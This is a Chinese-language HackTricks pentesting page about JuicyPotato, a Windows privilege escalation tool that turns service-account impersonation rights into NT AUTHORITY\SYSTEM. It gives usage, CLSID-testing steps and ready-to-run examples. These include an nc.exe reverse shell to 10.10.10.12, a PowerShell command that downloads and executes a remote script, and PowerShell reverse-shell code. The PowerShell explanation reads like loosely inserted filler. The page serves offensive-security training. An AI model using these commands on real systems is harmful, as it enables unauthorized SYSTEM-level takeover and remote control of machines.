# JuicyPotato

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我在**推特**[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

{% hint style="warning" %}
**JuicyPotato在Windows Server 2019和Windows 10版本1809之后不起作用**。然而，可以使用[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)来**利用相同的权限并获得`NT AUTHORITY\SYSTEM`级别的访问权限**。_**查看：**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato（滥用黄金权限）<a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_这是一个加糖版本的_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, 加了一点料，即**另一个本地权限提升工具，从Windows服务账户提升到NT AUTHORITY\SYSTEM**_

#### 你可以从[https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)下载juicypotato

### 概述<a href="#summary" id="summary"></a>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)及其[变种](https://github.com/decoder-it/lonelypotato)利用基于[`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126)的权限提升链，该服务在`127.0.0.1:6666`上具有MiTM监听器，并且当你拥有`SeImpersonate`或`SeAssignPrimaryToken`权限时。在对Windows进行构建审查时，我们发现了一个故意禁用了`BITS`并占用了端口`6666`的设置。

我们决定武装[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)：**欢迎Juicy Potato**。

> 想了解理论，请参阅[Rotten Potato - 从服务账户到SYSTEM的权限提升](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)，并按照链接和参考链进行查看。

我们发现，除了`BITS`之外，还有几个COM服务器可以滥用。它们只需要：

1. 可以由当前用户实例化，通常是具有模拟权限的“服务用户”
2. 实现`IMarshal`接口
3. 以提升的用户（SYSTEM、管理员等）身份运行

经过一些测试，我们获得并测试了在几个Windows版本上的[有趣的CLSID列表](http://ohpe.it/juicy-potato/CLSID/)。

### 详细信息<a href="#juicy-details" id="juicy-details"></a>

JuicyPotato允许你：

* **目标CLSID** _选择任何你想要的CLSID。_ [_在这里_](http://ohpe.it/juicy-potato/CLSID/) _你可以找到按操作系统组织的列表。_
* **COM监听端口** _定义你喜欢的COM监听端口（而不是硬编码的6666）_
* **COM监听IP地址** _将服务器绑定到任何IP_
* **进程创建模式** _根据模拟用户的权限，你可以选择：_
* `CreateProcessWithToken`（需要`SeImpersonate`）
* `CreateProcessAsUser`（需要`SeAssignPrimaryToken`）
* `both`
* **要启动的进程** _如果利用成功，启动一个可执行文件或脚本_
* **进程参数** _自定义启动进程的参数_
* **RPC服务器地址** _为了隐蔽，你可以认证到一个外部RPC服务器_
* **RPC服务器端口** _如果你想要认证到一个外部服务器并且防火墙阻止了端口`135`，这将非常有用..._
* **测试模式** _主要用于测试目的，即测试CLSID。它创建DCOM并打印令牌的用户。查看_ [_这里进行测试_](http://ohpe.it/juicy-potato/Test/)
### 用法 <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 总结思路 <a href="#final-thoughts" id="final-thoughts"></a>

如果用户具有`SeImpersonate`或`SeAssignPrimaryToken`权限，则可以成为**SYSTEM**。

几乎不可能防止所有这些COM服务器的滥用。你可以考虑通过`DCOMCNFG`修改这些对象的权限，但祝你好运，这将是具有挑战性的。

实际的解决方案是保护在`* SERVICE`账户下运行的敏感账户和应用程序。停止`DCOM`肯定会阻止此漏洞利用，但可能对底层操作系统产生严重影响。

来源：[http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## 示例

注意：访问[此页面](https://ohpe.it/juicy-potato/CLSID/)获取要尝试的CLSIDs列表。

### 获取一个nc.exe反向shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell反向连接

在Windows系统中，Powershell是一种功能强大的脚本语言和命令行工具。它可以用于执行各种任务，包括与远程主机建立连接。

反向连接是一种技术，它允许攻击者通过与目标主机建立连接来获取对目标系统的控制权。在Powershell中，可以使用反向连接来实现本地特权升级。

以下是使用Powershell实现反向连接的步骤：

1. 首先，需要在攻击者的主机上启动一个监听器，以侦听目标主机的连接请求。

```powershell
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', <port>)
$listener.Start()
$socket = $listener.AcceptTcpClient().GetStream()
```

2. 接下来，需要在目标主机上执行以下Powershell命令，以与攻击者的主机建立连接。

```powershell
$client = New-Object System.Net.Sockets.TcpClient('<attacker_ip>', <attacker_port>)
$stream = $client.GetStream()
```

3. 一旦连接建立，攻击者就可以在目标主机上执行任意的命令。

```powershell
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$cmd = $reader.ReadLine()
$output = Invoke-Expression $cmd
$writer.WriteLine($output)
$writer.Flush()
```

通过使用Powershell的反向连接技术，攻击者可以在目标主机上执行命令并获取本地特权。然而，需要注意的是，这种技术可能会受到防火墙和安全软件的限制，因此在实施之前需要进行适当的测试和评估。
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 启动新的CMD（如果你有RDP访问权限）

![](<../../.gitbook/assets/image (37).png>)

## CLSID问题

通常情况下，JuicyPotato使用的默认CLSID**无法正常工作**，导致漏洞利用失败。通常需要多次尝试才能找到**可用的CLSID**。要获取特定操作系统的要尝试的CLSID列表，您应该访问此页面：

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **检查CLSID**

首先，您需要一些除了juicypotato.exe之外的可执行文件。

下载[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)并将其加载到您的PS会话中，然后下载并执行[GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)。该脚本将创建一个可能的CLSID列表以供测试。

然后下载[test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(更改路径以匹配CLSID列表和juicypotato可执行文件)并执行它。它将开始尝试每个CLSID，**当端口号发生变化时，表示CLSID有效**。

**使用参数-c检查**可用的CLSID。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
